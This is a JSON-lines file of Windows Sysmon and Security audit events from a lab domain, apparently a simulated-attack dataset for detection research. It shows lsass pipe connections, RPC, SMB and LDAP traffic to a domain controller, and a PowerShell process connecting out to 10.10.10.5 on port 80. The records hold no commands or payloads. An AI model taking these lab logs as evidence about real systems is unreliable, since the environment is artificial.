{"Task":18,"EventReceivedTime":"2020-07-22 00:18:50","port":55069,"PipeName":"\\lsass","SeverityValue":2,"RuleName":"-","Keywords":-9223372036854775808,"ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","@version":"1","SourceModuleType":"im_msvistalog","Version":1,"tags":["mordorDataset"],"Domain":"NT AUTHORITY","ProcessGuid":"{47b21e2e-951a-5f14-0100-000000000400}","SourceName":"Microsoft-Windows-Sysmon","ProcessId":"4","UserID":"S-1-5-18","Channel":"Microsoft-Windows-Sysmon/Operational","SourceModuleName":"eventlog","Message":"Pipe Connected:\r\nRuleName: -\r\nEventType: ConnectPipe\r\nUtcTime: 2020-07-22 04:18:49.387\r\nProcessGuid: {47b21e2e-951a-5f14-0100-000000000400}\r\nProcessId: 4\r\nPipeName: \\lsass\r\nImage: System","Image":"System","EventTypeOrignal":"INFO","UtcTime":"2020-07-22 04:18:49.387","@timestamp":"2020-07-22T04:18:51.008Z","Hostname":"MORDORDC.mordor.local","host":"wec.internal.cloudapp.net","AccountType":"User","AccountName":"SYSTEM","ExecutionProcessID":5068,"OpcodeValue":0,"EventType":"ConnectPipe","EventTime":"2020-07-22 00:18:49","Severity":"INFO","EventID":18,"ThreadID":3296,"RecordNumber":1482067}
{"Task":18,"EventReceivedTime":"2020-07-22 00:18:50","port":55069,"PipeName":"\\lsass","SeverityValue":2,"RuleName":"-","Keywords":-9223372036854775808,"ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","@version":"1","SourceModuleType":"im_msvistalog","Version":1,"tags":["mordorDataset"],"Domain":"NT AUTHORITY","ProcessGuid":"{47b21e2e-951a-5f14-0100-000000000400}","SourceName":"Microsoft-Windows-Sysmon","ProcessId":"4","UserID":"S-1-5-18","Channel":"Microsoft-Windows-Sysmon/Operational","SourceModuleName":"eventlog","Message":"Pipe Connected:\r\nRuleName: -\r\nEventType: ConnectPipe\r\nUtcTime: 2020-07-22 04:18:49.653\r\nProcessGuid: {47b21e2e-951a-5f14-0100-000000000400}\r\nProcessId: 4\r\nPipeName: \\lsass\r\nImage: System","Image":"System","EventTypeOrignal":"INFO","UtcTime":"2020-07-22 04:18:49.653","@timestamp":"2020-07-22T04:18:51.008Z","Hostname":"MORDORDC.mordor.local","host":"wec.internal.cloudapp.net","AccountType":"User","AccountName":"SYSTEM","ExecutionProcessID":5068,"OpcodeValue":0,"EventType":"ConnectPipe","EventTime":"2020-07-22 00:18:49","Severity":"INFO","EventID":18,"ThreadID":3296,"RecordNumber":1482068}
{"DestinationPort":"135","EventReceivedTime":"2020-07-22 00:18:50","SourceIp":"172.18.38.6","SourceHostname":"-","port":55069,"SeverityValue":2,"RuleName":"-","Keywords":-9223372036854775808,"ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","Version":5,"SourceIsIpv6":"false","ProcessGuid":"{47b21e2e-952c-5f14-0f00-000000000400}","ProcessId":"976","Channel":"Microsoft-Windows-Sysmon/Operational","Message":"Network connection detected:\r\nRuleName: -\r\nUtcTime: 2020-07-22 04:18:49.189\r\nProcessGuid: {47b21e2e-952c-5f14-0f00-000000000400}\r\nProcessId: 976\r\nImage: C:\\Windows\\System32\\svchost.exe\r\nUser: NT AUTHORITY\\NETWORK SERVICE\r\nProtocol: tcp\r\nInitiated: false\r\nSourceIsIpv6: false\r\nSourceIp: 172.18.38.6\r\nSourceHostname: -\r\nSourcePort: 58085\r\nSourcePortName: -\r\nDestinationIsIpv6: false\r\nDestinationIp: 172.18.38.5\r\nDestinationHostname: -\r\nDestinationPort: 135\r\nDestinationPortName: -","@timestamp":"2020-07-22T04:18:51.008Z","DestinationPortName":"-","AccountType":"User","AccountName":"SYSTEM","ThreadID":6920,"Task":3,"RecordNumber":1482069,"Initiated":"false","DestinationIp":"172.18.38.5","@version":"1","SourceModuleType":"im_msvistalog","tags":["mordorDataset"],"Domain":"NT AUTHORITY","DestinationHostname":"-","SourceName":"Microsoft-Windows-Sysmon","UserID":"S-1-5-18","Protocol":"tcp","SourceModuleName":"eventlog","Image":"C:\\Windows\\System32\\svchost.exe","UtcTime":"2020-07-22 04:18:49.189","Hostname":"MORDORDC.mordor.local","SourcePortName":"-","DestinationIsIpv6":"false","host":"wec.internal.cloudapp.net","ExecutionProcessID":5068,"EventType":"INFO","OpcodeValue":0,"EventTime":"2020-07-22 00:18:50","Severity":"INFO","EventID":3,"User":"NT AUTHORITY\\NETWORK SERVICE","SourcePort":"58085"}
{"DestinationPort":"49667","EventReceivedTime":"2020-07-22 00:18:50","SourceIp":"172.18.38.6","SourceHostname":"-","port":55069,"SeverityValue":2,"RuleName":"-","Keywords":-9223372036854775808,"ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","Version":5,"SourceIsIpv6":"false","ProcessGuid":"{47b21e2e-9523-5f14-0c00-000000000400}","ProcessId":"704","Channel":"Microsoft-Windows-Sysmon/Operational","Message":"Network connection detected:\r\nRuleName: -\r\nUtcTime: 2020-07-22 04:18:49.192\r\nProcessGuid: {47b21e2e-9523-5f14-0c00-000000000400}\r\nProcessId: 704\r\nImage: C:\\Windows\\System32\\lsass.exe\r\nUser: NT AUTHORITY\\SYSTEM\r\nProtocol: tcp\r\nInitiated: false\r\nSourceIsIpv6: false\r\nSourceIp: 172.18.38.6\r\nSourceHostname: -\r\nSourcePort: 58086\r\nSourcePortName: -\r\nDestinationIsIpv6: false\r\nDestinationIp: 172.18.38.5\r\nDestinationHostname: -\r\nDestinationPort: 49667\r\nDestinationPortName: -","@timestamp":"2020-07-22T04:18:51.008Z","DestinationPortName":"-","AccountType":"User","AccountName":"SYSTEM","ThreadID":6920,"Task":3,"RecordNumber":1482070,"Initiated":"false","DestinationIp":"172.18.38.5","@version":"1","SourceModuleType":"im_msvistalog","tags":["mordorDataset"],"Domain":"NT AUTHORITY","DestinationHostname":"-","SourceName":"Microsoft-Windows-Sysmon","UserID":"S-1-5-18","Protocol":"tcp","SourceModuleName":"eventlog","Image":"C:\\Windows\\System32\\lsass.exe","UtcTime":"2020-07-22 04:18:49.192","Hostname":"MORDORDC.mordor.local","SourcePortName":"-","DestinationIsIpv6":"false","host":"wec.internal.cloudapp.net","ExecutionProcessID":5068,"EventType":"INFO","OpcodeValue":0,"EventTime":"2020-07-22 00:18:50","Severity":"INFO","EventID":3,"User":"NT AUTHORITY\\SYSTEM","SourcePort":"58086"}
{"DestinationPort":"65337","EventReceivedTime":"2020-07-22 00:18:52","SourceIp":"172.18.38.5","SourceHostname":"-","port":55069,"SeverityValue":2,"RuleName":"-","Keywords":-9223372036854775808,"ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","Version":5,"SourceIsIpv6":"false","ProcessGuid":"{47b21e2e-9523-5f14-0c00-000000000400}","ProcessId":"704","Channel":"Microsoft-Windows-Sysmon/Operational","Message":"Network connection detected:\r\nRuleName: -\r\nUtcTime: 2020-07-22 04:18:49.197\r\nProcessGuid: {47b21e2e-9523-5f14-0c00-000000000400}\r\nProcessId: 704\r\nImage: C:\\Windows\\System32\\lsass.exe\r\nUser: NT AUTHORITY\\SYSTEM\r\nProtocol: udp\r\nInitiated: false\r\nSourceIsIpv6: false\r\nSourceIp: 172.18.38.5\r\nSourceHostname: -\r\nSourcePort: 389\r\nSourcePortName: -\r\nDestinationIsIpv6: false\r\nDestinationIp: 172.18.38.6\r\nDestinationHostname: -\r\nDestinationPort: 65337\r\nDestinationPortName: -","@timestamp":"2020-07-22T04:18:52.013Z","DestinationPortName":"-","AccountType":"User","AccountName":"SYSTEM","ThreadID":6920,"Task":3,"RecordNumber":1482071,"Initiated":"false","DestinationIp":"172.18.38.6","@version":"1","SourceModuleType":"im_msvistalog","tags":["mordorDataset"],"Domain":"NT AUTHORITY","DestinationHostname":"-","SourceName":"Microsoft-Windows-Sysmon","UserID":"S-1-5-18","Protocol":"udp","SourceModuleName":"eventlog","Image":"C:\\Windows\\System32\\lsass.exe","UtcTime":"2020-07-22 04:18:49.197","Hostname":"MORDORDC.mordor.local","SourcePortName":"-","DestinationIsIpv6":"false","host":"wec.internal.cloudapp.net","ExecutionProcessID":5068,"EventType":"INFO","OpcodeValue":0,"EventTime":"2020-07-22 00:18:50","Severity":"INFO","EventID":3,"User":"NT AUTHORITY\\SYSTEM","SourcePort":"389"}
{"DestinationPort":"445","EventReceivedTime":"2020-07-22 00:18:53","SourceIp":"172.18.38.6","SourceHostname":"-","port":55069,"SeverityValue":2,"RuleName":"-","Keywords":-9223372036854775808,"ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","Version":5,"SourceIsIpv6":"false","ProcessGuid":"{47b21e2e-951a-5f14-0100-000000000400}","ProcessId":"4","Channel":"Microsoft-Windows-Sysmon/Operational","Message":"Network connection detected:\r\nRuleName: -\r\nUtcTime: 2020-07-22 04:18:49.309\r\nProcessGuid: {47b21e2e-951a-5f14-0100-000000000400}\r\nProcessId: 4\r\nImage: System\r\nUser: NT AUTHORITY\\SYSTEM\r\nProtocol: tcp\r\nInitiated: false\r\nSourceIsIpv6: false\r\nSourceIp: 172.18.38.6\r\nSourceHostname: -\r\nSourcePort: 58087\r\nSourcePortName: -\r\nDestinationIsIpv6: false\r\nDestinationIp: 172.18.38.5\r\nDestinationHostname: -\r\nDestinationPort: 445\r\nDestinationPortName: -","@timestamp":"2020-07-22T04:18:53.018Z","DestinationPortName":"-","AccountType":"User","AccountName":"SYSTEM","ThreadID":6920,"Task":3,"RecordNumber":1482072,"Initiated":"false","DestinationIp":"172.18.38.5","@version":"1","SourceModuleType":"im_msvistalog","tags":["mordorDataset"],"Domain":"NT AUTHORITY","DestinationHostname":"-","SourceName":"Microsoft-Windows-Sysmon","UserID":"S-1-5-18","Protocol":"tcp","SourceModuleName":"eventlog","Image":"System","UtcTime":"2020-07-22 04:18:49.309","Hostname":"MORDORDC.mordor.local","SourcePortName":"-","DestinationIsIpv6":"false","host":"wec.internal.cloudapp.net","ExecutionProcessID":5068,"EventType":"INFO","OpcodeValue":0,"EventTime":"2020-07-22 00:18:50","Severity":"INFO","EventID":3,"User":"NT AUTHORITY\\SYSTEM","SourcePort":"58087"}
{"DestinationPort":"65338","EventReceivedTime":"2020-07-22 00:18:53","SourceIp":"172.18.38.5","SourceHostname":"-","port":55069,"SeverityValue":2,"RuleName":"-","Keywords":-9223372036854775808,"ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","Version":5,"SourceIsIpv6":"false","ProcessGuid":"{47b21e2e-9523-5f14-0c00-000000000400}","ProcessId":"704","Channel":"Microsoft-Windows-Sysmon/Operational","Message":"Network connection detected:\r\nRuleName: -\r\nUtcTime: 2020-07-22 04:18:49.382\r\nProcessGuid: {47b21e2e-9523-5f14-0c00-000000000400}\r\nProcessId: 704\r\nImage: C:\\Windows\\System32\\lsass.exe\r\nUser: NT AUTHORITY\\SYSTEM\r\nProtocol: udp\r\nInitiated: false\r\nSourceIsIpv6: false\r\nSourceIp: 172.18.38.5\r\nSourceHostname: -\r\nSourcePort: 389\r\nSourcePortName: -\r\nDestinationIsIpv6: false\r\nDestinationIp: 172.18.38.6\r\nDestinationHostname: -\r\nDestinationPort: 65338\r\nDestinationPortName: -","@timestamp":"2020-07-22T04:18:53.018Z","DestinationPortName":"-","AccountType":"User","AccountName":"SYSTEM","ThreadID":6920,"Task":3,"RecordNumber":1482073,"Initiated":"false","DestinationIp":"172.18.38.6","@version":"1","SourceModuleType":"im_msvistalog","tags":["mordorDataset"],"Domain":"NT AUTHORITY","DestinationHostname":"-","SourceName":"Microsoft-Windows-Sysmon","UserID":"S-1-5-18","Protocol":"udp","SourceModuleName":"eventlog","Image":"C:\\Windows\\System32\\lsass.exe","UtcTime":"2020-07-22 04:18:49.382","Hostname":"MORDORDC.mordor.local","SourcePortName":"-","DestinationIsIpv6":"false","host":"wec.internal.cloudapp.net","ExecutionProcessID":5068,"EventType":"INFO","OpcodeValue":0,"EventTime":"2020-07-22 00:18:50","Severity":"INFO","EventID":3,"User":"NT AUTHORITY\\SYSTEM","SourcePort":"389"}
{"DestinationPort":"389","EventReceivedTime":"2020-07-22 00:18:53","SourceIp":"172.18.38.6","SourceHostname":"-","port":55069,"SeverityValue":2,"RuleName":"-","Keywords":-9223372036854775808,"ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","Version":5,"SourceIsIpv6":"false","ProcessGuid":"{47b21e2e-9523-5f14-0c00-000000000400}","ProcessId":"704","Channel":"Microsoft-Windows-Sysmon/Operational","Message":"Network connection detected:\r\nRuleName: -\r\nUtcTime: 2020-07-22 04:18:49.489\r\nProcessGuid: {47b21e2e-9523-5f14-0c00-000000000400}\r\nProcessId: 704\r\nImage: C:\\Windows\\System32\\lsass.exe\r\nUser: NT AUTHORITY\\SYSTEM\r\nProtocol: tcp\r\nInitiated: false\r\nSourceIsIpv6: false\r\nSourceIp: 172.18.38.6\r\nSourceHostname: -\r\nSourcePort: 58088\r\nSourcePortName: -\r\nDestinationIsIpv6: false\r\nDestinationIp: 172.18.38.5\r\nDestinationHostname: -\r\nDestinationPort: 389\r\nDestinationPortName: -","@timestamp":"2020-07-22T04:18:53.019Z","DestinationPortName":"-","AccountType":"User","AccountName":"SYSTEM","ThreadID":6920,"Task":3,"RecordNumber":1482074,"Initiated":"false","DestinationIp":"172.18.38.5","@version":"1","SourceModuleType":"im_msvistalog","tags":["mordorDataset"],"Domain":"NT AUTHORITY","DestinationHostname":"-","SourceName":"Microsoft-Windows-Sysmon","UserID":"S-1-5-18","Protocol":"tcp","SourceModuleName":"eventlog","Image":"C:\\Windows\\System32\\lsass.exe","UtcTime":"2020-07-22 04:18:49.489","Hostname":"MORDORDC.mordor.local","SourcePortName":"-","DestinationIsIpv6":"false","host":"wec.internal.cloudapp.net","ExecutionProcessID":5068,"EventType":"INFO","OpcodeValue":0,"EventTime":"2020-07-22 00:18:50","Severity":"INFO","EventID":3,"User":"NT AUTHORITY\\SYSTEM","SourcePort":"58088"}
{"DestinationPort":"389","EventReceivedTime":"2020-07-22 00:18:53","SourceIp":"172.18.38.6","SourceHostname":"-","port":55069,"SeverityValue":2,"RuleName":"-","Keywords":-9223372036854775808,"ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","Version":5,"SourceIsIpv6":"false","ProcessGuid":"{47b21e2e-9523-5f14-0c00-000000000400}","ProcessId":"704","Channel":"Microsoft-Windows-Sysmon/Operational","Message":"Network connection detected:\r\nRuleName: -\r\nUtcTime: 2020-07-22 04:18:49.493\r\nProcessGuid: {47b21e2e-9523-5f14-0c00-000000000400}\r\nProcessId: 704\r\nImage: C:\\Windows\\System32\\lsass.exe\r\nUser: NT AUTHORITY\\SYSTEM\r\nProtocol: tcp\r\nInitiated: false\r\nSourceIsIpv6: false\r\nSourceIp: 172.18.38.6\r\nSourceHostname: -\r\nSourcePort: 58089\r\nSourcePortName: -\r\nDestinationIsIpv6: false\r\nDestinationIp: 172.18.38.5\r\nDestinationHostname: -\r\nDestinationPort: 389\r\nDestinationPortName: -","@timestamp":"2020-07-22T04:18:53.019Z","DestinationPortName":"-","AccountType":"User","AccountName":"SYSTEM","ThreadID":6920,"Task":3,"RecordNumber":1482075,"Initiated":"false","DestinationIp":"172.18.38.5","@version":"1","SourceModuleType":"im_msvistalog","tags":["mordorDataset"],"Domain":"NT AUTHORITY","DestinationHostname":"-","SourceName":"Microsoft-Windows-Sysmon","UserID":"S-1-5-18","Protocol":"tcp","SourceModuleName":"eventlog","Image":"C:\\Windows\\System32\\lsass.exe","UtcTime":"2020-07-22 04:18:49.493","Hostname":"MORDORDC.mordor.local","SourcePortName":"-","DestinationIsIpv6":"false","host":"wec.internal.cloudapp.net","ExecutionProcessID":5068,"EventType":"INFO","OpcodeValue":0,"EventTime":"2020-07-22 00:18:50","Severity":"INFO","EventID":3,"User":"NT AUTHORITY\\SYSTEM","SourcePort":"58089"}
{"DestinationPort":"389","EventReceivedTime":"2020-07-22 00:18:53","SourceIp":"172.18.38.6","SourceHostname":"-","port":55069,"SeverityValue":2,"RuleName":"-","Keywords":-9223372036854775808,"ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","Version":5,"SourceIsIpv6":"false","ProcessGuid":"{47b21e2e-9523-5f14-0c00-000000000400}","ProcessId":"704","Channel":"Microsoft-Windows-Sysmon/Operational","Message":"Network connection detected:\r\nRuleName: -\r\nUtcTime: 2020-07-22 04:18:49.502\r\nProcessGuid: {47b21e2e-9523-5f14-0c00-000000000400}\r\nProcessId: 704\r\nImage: C:\\Windows\\System32\\lsass.exe\r\nUser: NT AUTHORITY\\SYSTEM\r\nProtocol: tcp\r\nInitiated: false\r\nSourceIsIpv6: false\r\nSourceIp: 172.18.38.6\r\nSourceHostname: -\r\nSourcePort: 58090\r\nSourcePortName: -\r\nDestinationIsIpv6: false\r\nDestinationIp: 172.18.38.5\r\nDestinationHostname: -\r\nDestinationPort: 389\r\nDestinationPortName: -","@timestamp":"2020-07-22T04:18:53.019Z","DestinationPortName":"-","AccountType":"User","AccountName":"SYSTEM","ThreadID":6920,"Task":3,"RecordNumber":1482076,"Initiated":"false","DestinationIp":"172.18.38.5","@version":"1","SourceModuleType":"im_msvistalog","tags":["mordorDataset"],"Domain":"NT AUTHORITY","DestinationHostname":"-","SourceName":"Microsoft-Windows-Sysmon","UserID":"S-1-5-18","Protocol":"tcp","SourceModuleName":"eventlog","Image":"C:\\Windows\\System32\\lsass.exe","UtcTime":"2020-07-22 04:18:49.502","Hostname":"MORDORDC.mordor.local","SourcePortName":"-","DestinationIsIpv6":"false","host":"wec.internal.cloudapp.net","ExecutionProcessID":5068,"EventType":"INFO","OpcodeValue":0,"EventTime":"2020-07-22 00:18:50","Severity":"INFO","EventID":3,"User":"NT AUTHORITY\\SYSTEM","SourcePort":"58090"}
{"DestinationPort":"54360","EventReceivedTime":"2020-07-22 00:18:53","SourceIp":"172.18.38.5","SourceHostname":"-","port":55069,"SeverityValue":2,"RuleName":"-","Keywords":-9223372036854775808,"ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","Version":5,"SourceIsIpv6":"false","ProcessGuid":"{47b21e2e-9538-5f14-4d00-000000000400}","ProcessId":"3484","Channel":"Microsoft-Windows-Sysmon/Operational","Message":"Network connection detected:\r\nRuleName: -\r\nUtcTime: 2020-07-22 04:18:49.529\r\nProcessGuid: {47b21e2e-9538-5f14-4d00-000000000400}\r\nProcessId: 3484\r\nImage: C:\\Windows\\System32\\dns.exe\r\nUser: NT AUTHORITY\\SYSTEM\r\nProtocol: udp\r\nInitiated: false\r\nSourceIsIpv6: false\r\nSourceIp: 172.18.38.5\r\nSourceHostname: -\r\nSourcePort: 53\r\nSourcePortName: -\r\nDestinationIsIpv6: false\r\nDestinationIp: 172.18.38.6\r\nDestinationHostname: -\r\nDestinationPort: 54360\r\nDestinationPortName: -","@timestamp":"2020-07-22T04:18:53.020Z","DestinationPortName":"-","AccountType":"User","AccountName":"SYSTEM","ThreadID":6920,"Task":3,"RecordNumber":1482077,"Initiated":"false","DestinationIp":"172.18.38.6","@version":"1","SourceModuleType":"im_msvistalog","tags":["mordorDataset"],"Domain":"NT AUTHORITY","DestinationHostname":"-","SourceName":"Microsoft-Windows-Sysmon","UserID":"S-1-5-18","Protocol":"udp","SourceModuleName":"eventlog","Image":"C:\\Windows\\System32\\dns.exe","UtcTime":"2020-07-22 04:18:49.529","Hostname":"MORDORDC.mordor.local","SourcePortName":"-","DestinationIsIpv6":"false","host":"wec.internal.cloudapp.net","ExecutionProcessID":5068,"EventType":"INFO","OpcodeValue":0,"EventTime":"2020-07-22 00:18:50","Severity":"INFO","EventID":3,"User":"NT AUTHORITY\\SYSTEM","SourcePort":"53"}
{"DestinationPort":"54361","EventReceivedTime":"2020-07-22 00:18:53","SourceIp":"172.18.38.5","SourceHostname":"-","port":55069,"SeverityValue":2,"RuleName":"-","Keywords":-9223372036854775808,"ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","Version":5,"SourceIsIpv6":"false","ProcessGuid":"{47b21e2e-9523-5f14-0c00-000000000400}","ProcessId":"704","Channel":"Microsoft-Windows-Sysmon/Operational","Message":"Network connection detected:\r\nRuleName: -\r\nUtcTime: 2020-07-22 04:18:49.531\r\nProcessGuid: {47b21e2e-9523-5f14-0c00-000000000400}\r\nProcessId: 704\r\nImage: C:\\Windows\\System32\\lsass.exe\r\nUser: NT AUTHORITY\\SYSTEM\r\nProtocol: udp\r\nInitiated: false\r\nSourceIsIpv6: false\r\nSourceIp: 172.18.38.5\r\nSourceHostname: -\r\nSourcePort: 389\r\nSourcePortName: -\r\nDestinationIsIpv6: false\r\nDestinationIp: 172.18.38.6\r\nDestinationHostname: -\r\nDestinationPort: 54361\r\nDestinationPortName: -","@timestamp":"2020-07-22T04:18:53.020Z","DestinationPortName":"-","AccountType":"User","AccountName":"SYSTEM","ThreadID":6920,"Task":3,"RecordNumber":1482078,"Initiated":"false","DestinationIp":"172.18.38.6","@version":"1","SourceModuleType":"im_msvistalog","tags":["mordorDataset"],"Domain":"NT AUTHORITY","DestinationHostname":"-","SourceName":"Microsoft-Windows-Sysmon","UserID":"S-1-5-18","Protocol":"udp","SourceModuleName":"eventlog","Image":"C:\\Windows\\System32\\lsass.exe","UtcTime":"2020-07-22 04:18:49.531","Hostname":"MORDORDC.mordor.local","SourcePortName":"-","DestinationIsIpv6":"false","host":"wec.internal.cloudapp.net","ExecutionProcessID":5068,"EventType":"INFO","OpcodeValue":0,"EventTime":"2020-07-22 00:18:50","Severity":"INFO","EventID":3,"User":"NT AUTHORITY\\SYSTEM","SourcePort":"389"}
{"DestinationPort":"80","EventReceivedTime":"2020-07-22 00:18:53","SourceIp":"172.18.39.5","SourceHostname":"-","port":55069,"SeverityValue":2,"RuleName":"-","Keywords":-9223372036854775808,"ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","Version":5,"SourceIsIpv6":"false","ProcessGuid":"{b59756a9-b239-5f17-5307-000000000400}","ProcessId":"9076","Channel":"Microsoft-Windows-Sysmon/Operational","Message":"Network connection detected:\r\nRuleName: -\r\nUtcTime: 2020-07-22 04:18:48.525\r\nProcessGuid: {b59756a9-b239-5f17-5307-000000000400}\r\nProcessId: 9076\r\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nUser: MORDOR\\pgustavo\r\nProtocol: tcp\r\nInitiated: true\r\nSourceIsIpv6: false\r\nSourceIp: 172.18.39.5\r\nSourceHostname: -\r\nSourcePort: 51070\r\nSourcePortName: -\r\nDestinationIsIpv6: false\r\nDestinationIp: 10.10.10.5\r\nDestinationHostname: -\r\nDestinationPort: 80\r\nDestinationPortName: -","@timestamp":"2020-07-22T04:18:53.020Z","DestinationPortName":"-","AccountType":"User","AccountName":"SYSTEM","ThreadID":6108,"Task":3,"RecordNumber":1782119,"Initiated":"true","DestinationIp":"10.10.10.5","@version":"1","SourceModuleType":"im_msvistalog","tags":["mordorDataset"],"Domain":"NT AUTHORITY","DestinationHostname":"-","SourceName":"Microsoft-Windows-Sysmon","UserID":"S-1-5-18","Protocol":"tcp","SourceModuleName":"eventlog","Image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","UtcTime":"2020-07-22 04:18:48.525","Hostname":"WORKSTATION5.mordor.local","SourcePortName":"-","DestinationIsIpv6":"false","host":"wec.internal.cloudapp.net","ExecutionProcessID":9368,"EventType":"INFO","OpcodeValue":0,"EventTime":"2020-07-22 00:18:50","Severity":"INFO","EventID":3,"User":"MORDOR\\pgustavo","SourcePort":"51070"}
{"Task":12810,"Direction":"%%14593","Opcode":"Info","SourcePort":"49988","FilterRTID":"71485","LayerName":"%%14611","EventReceivedTime":"2020-07-22 00:18:54","port":55069,"RemoteUserID":"S-1-0-0","SeverityValue":2,"Keywords":-9214364837600034816,"ProviderGuid":"{54849625-5478-4994-A5BA-3E3B0328C30D}","@version":"1","RemoteMachineID":"S-1-0-0","SourceModuleType":"im_msvistalog","Version":1,"tags":["mordorDataset"],"SourceName":"Microsoft-Windows-Security-Auditing","SourceAddress":"172.18.39.5","ProcessId":"3580","DestAddress":"169.254.169.254","Protocol":"6","Channel":"Security","SourceModuleName":"eventlog","Application":"\\device\\harddiskvolume2\\packages\\plugins\\microsoft.azure.networkwatcher.networkwatcheragentwindows\\1.4.1587.1\\networkwatcheragent\\networkwatcheragent.exe","Message":"The Windows Filtering Platform has permitted a connection.\r\n\r\nApplication Information:\r\n\tProcess ID:\t\t3580\r\n\tApplication Name:\t\\device\\harddiskvolume2\\packages\\plugins\\microsoft.azure.networkwatcher.networkwatcheragentwindows\\1.4.1587.1\\networkwatcheragent\\networkwatcheragent.exe\r\n\r\nNetwork Information:\r\n\tDirection:\t\tOutbound\r\n\tSource Address:\t\t172.18.39.5\r\n\tSource Port:\t\t49988\r\n\tDestination Address:\t169.254.169.254\r\n\tDestination Port:\t\t80\r\n\tProtocol:\t\t6\r\n\r\nFilter Information:\r\n\tFilter Run-Time ID:\t71485\r\n\tLayer Name:\t\tConnect\r\n\tLayer Run-Time ID:\t48","Category":"Filtering Platform Connection","@timestamp":"2020-07-22T04:18:54.026Z","LayerRTID":"48","Hostname":"WORKSTATION5.mordor.local","host":"wec.internal.cloudapp.net","ExecutionProcessID":4,"EventType":"AUDIT_SUCCESS","OpcodeValue":0,"EventTime":"2020-07-22 00:18:51","Severity":"INFO","EventID":5156,"DestPort":"80","ThreadID":3276,"RecordNumber":258651}
{"Task":12810,"Direction":"%%14593","Opcode":"Info","SourcePort":"49988","FilterRTID":"71485","LayerName":"%%14611","EventReceivedTime":"2020-07-22 00:18:54","port":55069,"RemoteUserID":"S-1-0-0","SeverityValue":2,"Keywords":-9214364837600034816,"ProviderGuid":"{54849625-5478-4994-A5BA-3E3B0328C30D}","@version":"1","RemoteMachineID":"S-1-0-0","SourceModuleType":"im_msvistalog","Version":1,"tags":["mordorDataset"],"SourceName":"Microsoft-Windows-Security-Auditing","SourceAddress":"172.18.39.5","ProcessId":"3580","DestAddress":"169.254.169.254","Protocol":"6","Channel":"Security","SourceModuleName":"eventlog","Application":"\\device\\harddiskvolume2\\packages\\plugins\\microsoft.azure.networkwatcher.networkwatcheragentwindows\\1.4.1587.1\\networkwatcheragent\\networkwatcheragent.exe","Message":"The Windows Filtering Platform has permitted a connection.\r\n\r\nApplication Information:\r\n\tProcess ID:\t\t3580\r\n\tApplication Name:\t\\device\\harddiskvolume2\\packages\\plugins\\microsoft.azure.networkwatcher.networkwatcheragentwindows\\1.4.1587.1\\networkwatcheragent\\networkwatcheragent.exe\r\n\r\nNetwork Information:\r\n\tDirection:\t\tOutbound\r\n\tSource Address:\t\t172.18.39.5\r\n\tSource Port:\t\t49988\r\n\tDestination Address:\t169.254.169.254\r\n\tDestination Port:\t\t80\r\n\tProtocol:\t\t6\r\n\r\nFilter Information:\r\n\tFilter Run-Time ID:\t71485\r\n\tLayer Name:\t\tConnect\r\n\tLayer Run-Time ID:\t48","Category":"Filtering Platform Connection","@timestamp":"2020-07-22T04:18:54.026Z","LayerRTID":"48","Hostname":"WORKSTATION5.mordor.local","host":"wec.internal.cloudapp.net","ExecutionProcessID":4,"EventType":"AUDIT_SUCCESS","OpcodeValue":0,"EventTime":"2020-07-22 00:18:51","Severity":"INFO","EventID":5156,"DestPort":"80","ThreadID":3276,"RecordNumber":258652}
{"Task":12810,"Direction":"%%14593","Opcode":"Info","SourcePort":"49685","FilterRTID":"69279","LayerName":"%%14611","EventReceivedTime":"2020-07-22 00:18:54","port":55069,"RemoteUserID":"S-1-0-0","SeverityValue":2,"Keywords":-9214364837600034816,"ProviderGuid":"{54849625-5478-4994-A5BA-3E3B0328C30D}","@version":"1","RemoteMachineID":"S-1-0-0","SourceModuleType":"im_msvistalog","Version":1,"tags":["mordorDataset"],"SourceName":"Microsoft-Windows-Security-Auditing","SourceAddress":"172.18.38.5","ProcessId":"3732","DestAddress":"168.63.129.16","Protocol":"6","Channel":"Security","SourceModuleName":"eventlog","Application":"\\device\\harddiskvolume4\\windowsazure\\packages\\guestagent\\windowsazureguestagent.exe","Message":"The Windows Filtering Platform has permitted a connection.\r\n\r\nApplication Information:\r\n\tProcess ID:\t\t3732\r\n\tApplication Name:\t\\device\\harddiskvolume4\\windowsazure\\packages\\guestagent\\windowsazureguestagent.exe\r\n\r\nNetwork Information:\r\n\tDirection:\t\tOutbound\r\n\tSource Address:\t\t172.18.38.5\r\n\tSource Port:\t\t49685\r\n\tDestination Address:\t168.63.129.16\r\n\tDestination Port:\t\t80\r\n\tProtocol:\t\t6\r\n\r\nFilter Information:\r\n\tFilter Run-Time ID:\t69279\r\n\tLayer Name:\t\tConnect\r\n\tLayer Run-Time ID:\t48","Category":"Filtering Platform Connection","@timestamp":"2020-07-22T04:18:54.026Z","LayerRTID":"48","Hostname":"MORDORDC.mordor.local","host":"wec.internal.cloudapp.net","ExecutionProcessID":4,"EventType":"AUDIT_SUCCESS","OpcodeValue":0,"EventTime":"2020-07-22 00:18:52","Severity":"INFO","EventID":5156,"DestPort":"80","ThreadID":4572,"RecordNumber":9020809}
